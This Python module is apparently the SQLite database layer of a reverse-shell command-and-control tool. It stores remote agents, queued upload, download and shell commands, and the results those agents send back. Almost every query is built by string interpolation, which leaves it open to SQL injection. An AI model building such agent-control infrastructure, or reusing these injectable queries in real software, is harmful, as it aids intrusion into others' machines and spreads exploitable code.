import sqlite3
from datetime import datetime
import os
now = datetime.now().strftime('%d.%m.%y %H:%M:%S')

# def db_init():
#     if not os.path.exists('sqlite-revshell.db'):
#         sqlite_connection = sqlite3.connect('sqlite-revshell.db')
#         sqlite_connection.execute('PRAGMA foreign_keys = 1')
#         cursor = sqlite_connection.cursor()
#         cursor.execute("CREATE TABLE agents (id INTEGER NOT NULL PRIMARY KEY, uid INTEGER, ip TEXT, agent_hostname TEXT, last_request_date TEXT, sleep INTEGER DEFAULT 1, UNIQUE(agent_hostname));")
#         cursor.execute("CREATE TABLE commands_type (id INTEGER NOT NULL PRIMARY KEY, type TEXT, UNIQUE(type));")
#         cursor.execute("CREATE TABLE commands (id INTEGER NOT NULL PRIMARY KEY, agent_hostname TEXT NOT NULL, type_id INTEGER, command TEXT, is_finished INTEGER DEFAULT 0, FOREIGN KEY (agent_hostname) REFERENCES agents(agent_hostname), FOREIGN KEY (type_id) REFERENCES commands_type(id));")
#         cursor.execute("CREATE TABLE results (id INTEGER PRIMARY KEY NOT NULL, command_id INTEGER NOT NULL, pwd TEXT, response TEXT, agent_uid INTEGER NOT NULL, FOREIGN KEY (command_id) REFERENCES commands(id));")
#         cursor.close()
#         sqlite_connection.close()
#         set_command(table='commands_type', type='upload')
#         set_command(table='commands_type', type='download')
#         set_command(table='commands_type', type='cmd')
#         set_command(table='commands_type', type='change_sleep_interval')

def set_command(**kwargs):
    ## kwargs can include - [table, 
    #                        uid, ip, agent_hostname, last_request_date, sleep
    #                        type,
    #                        agent_hostname, type_id, command, is_finished,
    #                        command_id, pwd, response, agent_uid]
    try:
        sqlite_connection = sqlite3.connect('sqlite-revshell.db')
        sqlite_connection.execute('PRAGMA foreign_keys = 1')
        cursor = sqlite_connection.cursor()
    except:
        print('DB not found')
        return
    # Working with table agents
    if kwargs['table'] == 'agents':
        try:
            cursor.execute(f"INSERT INTO agents(uid, ip, agent_hostname, last_request_date) VALUES({kwargs['uid']}, '{kwargs['ip']}', '{kwargs['agent_hostname']}', '{kwargs['last_request_date']}');")
        except sqlite3.IntegrityError as e:
            cursor.execute(f"UPDATE agents SET last_request_date = '{kwargs['last_request_date']}', uid = {kwargs['uid']} WHERE agent_hostname = '{kwargs['agent_hostname']}'")
        sqlite_connection.commit()
        cursor.close()
        sqlite_connection.close()
        return

    # Working with table commands_type
    if kwargs['table'] == 'commands_type':
        try:
            cursor.execute(f"INSERT INTO commands_type(type) VALUES('{kwargs['type']}');")
        except Exception as e:
            print(e)
        sqlite_connection.commit()
        cursor.close()
        sqlite_connection.close()
        return

    # Working with table commands
    if kwargs['table'] == 'commands':
        try:
            cursor.execute(f"INSERT INTO commands(agent_hostname, type_id, command) VALUES('{kwargs['agent_hostname']}', {kwargs['type_id']}, '{kwargs['command']}');")
            sqlite_connection.commit()
            last_command_id = cursor.execute(f"SELECT id FROM commands ORDER BY id DESC").fetchone()[0]
            cursor.close()
            sqlite_connection.close()
            return last_command_id
        except Exception as e:
            print(e)
        cursor.close()
        sqlite_connection.close()
        return

    # Working with table results
    if kwargs['table'] == 'results':
        try:
            cursor.execute(f"INSERT INTO results(command_id, pwd, response, agent_uid) VALUES({kwargs['command_id']}, '{kwargs['pwd']}', '{kwargs['response']}', {kwargs['agent_uid']});")
        except Exception as e:
            print(e)
        sqlite_connection.commit()
        cursor.close()
        sqlite_connection.close()
        return
    
    else:
        print(f"No such table - {kwargs['table']}")
        cursor.close()
        sqlite_connection.close()
        return

def update_agent_sleepinterval(UID, sleepinterval):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        cursor.execute(f"UPDATE agents SET sleep = {sleepinterval} WHERE uid = {UID}")
        sqlite_connection.commit()
        cursor.close()
        sqlite_connection.close()
    except Exception as e:
        print(e)
        cursor.close()
        sqlite_connection.close()
    return

def get_unexecuted_command_for_agent(agent_hostname):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    cursor = sqlite_connection.cursor()
    try:
        db_output = cursor.execute(f"SELECT * FROM commands where is_finished=0 and agent_hostname='{agent_hostname}'")
        output = db_output.fetchall()
        commands = [data for data in output]
        return commands[0][0], commands[0][2], commands[0][3]
    except Exception as e:
        # print(e)
        cursor.close()
        sqlite_connection.close()
        return 0,0,0

def get_agent_sleepinterval(UID):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    cursor = sqlite_connection.cursor()
    try:
        sleepinterval = cursor.execute(f"SELECT sleep FROM agents where uid={UID}").fetchone()[0]
        return sleepinterval
    except Exception as e:
        # print(e)
        cursor.close()
        sqlite_connection.close()
        return 0

def insert_result_and_update_is_finished(pwd, command_id, response, agent_uid):
    #Insert result
    set_command(table = 'results', pwd = pwd, command_id = command_id, response=response, agent_uid = agent_uid)
    #Set is_finished to 1 (True)
    update_is_finished_for_command(command_id)

def update_is_finished_for_command(id):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        cursor.execute(f"UPDATE commands SET is_finished = 1 WHERE id = {id}")
        sqlite_connection.commit()
        cursor.close()
        sqlite_connection.close()
    except Exception as e:
        print(e)
        cursor.close()
        sqlite_connection.close()
    return

def update_is_not_finished_for_command(id):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        cursor.execute(f"UPDATE commands SET is_finished = 0 WHERE id = {id}")
        sqlite_connection.commit()
        cursor.close()
        sqlite_connection.close()
    except Exception as e:
        print(e)
        cursor.close()
        sqlite_connection.close()
    return


def get_last_pwd_of_agent(UID):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        pwd = cursor.execute(f"SELECT pwd FROM results WHERE agent_uid={UID} ORDER BY id DESC").fetchone()[0]
        # print(pwd)
        cursor.close()
        sqlite_connection.close()
        return pwd
    except Exception as e:
        print(e)
        cursor.close()
        sqlite_connection.close()
    return 

def get_agent_hostname(UID):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        agent_hostname = cursor.execute(f"SELECT agent_hostname FROM agents WHERE uid={UID}").fetchone()[0]
        # print(pwd)
        cursor.close()
        sqlite_connection.close()
        return agent_hostname
    except Exception as e:
        print(e)
        cursor.close()
        sqlite_connection.close()
    return 


def select_all_from_table(**kwargs):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    cursor = sqlite_connection.cursor()
    try:
        db_output = cursor.execute(f"SELECT * FROM {kwargs['table']}")
        output = db_output.fetchall()
        print(f"Data from table - {kwargs['table']}:")
        for data in output:
            print(str(data)[1:-1])
        cursor.close()
        sqlite_connection.close()
    except Exception as e:
        print(f"No such table - {kwargs['table']}")
        cursor.close()
        sqlite_connection.close()
    return

def get_pwd_and_result_of_command(command_id):
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        pwd = cursor.execute(f"SELECT pwd FROM results WHERE command_id={command_id}").fetchone()[0]
        result = cursor.execute(f"SELECT response FROM results WHERE command_id={command_id}").fetchone()[0]
        cursor.close()
        sqlite_connection.close()
        return pwd, result
    except Exception as e:
        # print(e)
        cursor.close()
        sqlite_connection.close()
        return 0, 0

def get_agent_uids():
    sqlite_connection = sqlite3.connect('sqlite-revshell.db')
    sqlite_connection.execute('PRAGMA foreign_keys = 1')
    cursor = sqlite_connection.cursor()
    try:
        output = cursor.execute(f"SELECT uid FROM agents").fetchall()
        uids = [int(str(data)[1:-2]) for data in output]
        cursor.close()
        sqlite_connection.close()
        return uids
    except Exception as e:
        # print(e)
        cursor.close()
        sqlite_connection.close()
        return []

